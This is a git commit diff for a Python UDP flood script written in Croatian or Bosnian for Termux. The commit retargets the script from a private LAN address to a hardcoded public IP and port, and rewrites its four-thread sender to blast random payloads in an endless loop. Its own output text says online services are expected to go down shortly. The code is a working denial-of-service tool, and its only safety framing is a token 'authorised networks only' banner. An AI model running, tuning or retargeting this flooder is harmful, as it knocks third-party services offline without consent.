a9c80a1132516966433be60712e23fe5be7e8702
hakler26 <u1922182@gmail.com>
2026-09-11 23:23:29 -0500

    Update IP and port settings in udpflood_lite.py

--- udpflood_lite.py
+++ udpflood_lite.py
@@ -1,4 +1,3 @@
-# UDP FLOOD SKRIPTA #
 # -*- coding: utf-8 -*-
 import sys 
 import os
@@ -25,45 +24,42 @@ os.system("clear")
 
 print CYAN + "UDP Flood - Termux Lite Verzija" + RESET
 print " "
-print "Koristi samo na " + RED + "ovlaštenim mrežama!" + RESET
+print "Koristi samo na " + RED + "ovlastenim mrezama!" + RESET
 print "Napravio  > " + RED + "HunteR_" + RESET
 
-ip = "192.168.1.1"
-port = 80
+ip = "77.78.204.44"
+port = 1508
 print " "
-pitanje = raw_input("Zeliš li nastaviti? " + YELLOW + "[y/n]: " + RESET)
+pitanje = raw_input("Zelis li nastaviti? " + YELLOW + "[y/n]: " + RESET)
 sent = 0
 if pitanje.lower() == "y":
+    os.system("clear")
+    print "Mreza se flooda UDP paketima, ocekivan prestanak rada online servisa u kratkom vremenu."
     print " "
-    print "Mreža se flooda velikim UDP datagramima, očekivan prestanak rada online servisa u jako kratkom vremenu."
-    print " "
-
-    WIDTH = 50
-    
-    text = "Veličina UDP datagrama - "
-    value = "64.000B"
-    print "||" + (text + value).center(WIDTH).replace(value, CYAN + value + WHITE) + "||"
-
-    text = "IP - "
-    value = "192.168.1.1:80"
-    print "||" + (text + value).center(WIDTH).replace(value, CYAN + value + WHITE) + "||"
-
-    text = "ISP NE VIDI OVAJ PROMET!"
-    print "||" + (CYAN + text + WHITE).center(WIDTH) + "||"
-    def sender():
+    print YELLOW + "|| IP - 77.78.204.44:1508 (hardcoded)"
+    print YELLOW + "|| PAYLOAD - 20KB random generisanih podataka"
+    print YELLOW + "|| ISP moze vidjet ovaj promet! " + RESET
+    def sender(thread_id):
         while True:
-            sock.sendto(bytes, (ip, port))
-
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            try:
+                while True:
+                    sock.sendto(payload, (ip, port))
+            
+            finally:
+                sock.close()
+           
     threads = []
 
     for i in range(4):
-        t = threading.Thread(target=sender)
+        t = threading.Thread(target=sender, args=(i, ))
         t.daemon = True
         t.start()
         threads.append(t)
 
     while True:
-        pass
+        time.sleep(0.005)
 else:
     print "Prekinut nastavak. Izlazim..."
     exit()
